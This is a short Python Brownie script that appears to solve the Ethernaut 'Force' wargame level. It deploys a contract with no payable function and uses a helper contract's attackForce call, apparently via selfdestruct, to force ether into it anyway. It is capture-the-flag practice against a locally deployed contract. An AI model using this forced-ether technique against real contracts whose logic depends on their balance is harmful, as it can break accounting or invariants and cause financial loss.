from brownie import Force, SendEther, accounts, web3


def main():
  account_one, account_two = accounts[0], accounts[2]

  force_contract = Force.deploy({
    'from': account_one,
    'gas_price': 500000
  })

  print(f"current contract-balance: {force_contract.balance()}")

  send_contract = SendEther.deploy({
    'from': account_one,
    'gas_price': 500000
  })

  ## won't work due to payable function, or fallback/receive not being implemented in Force.sol
  # account_one.transfer(force_contract.address, 100, gas_price=50000)
  # data = send_contract.sendViaCall.call(force_contract.address, {'value': 100, 'gas_price': 500000})
  # print(f'data: {data}')

  account_one.transfer(send_contract.address, 100, gas_price=50000)
  print(f'send-contract-balance: {send_contract.balance()}')

  send_contract.attackForce(force_contract.address, {'gas_price': 500000})

  print(f"force contract-balance: {force_contract.balance()}")
 
  # self-destruct:
  # https://ethereum.stackexchange.com/questions/63987/can-a-contract-with-no-payable-function-have-ether/63988#63988
  




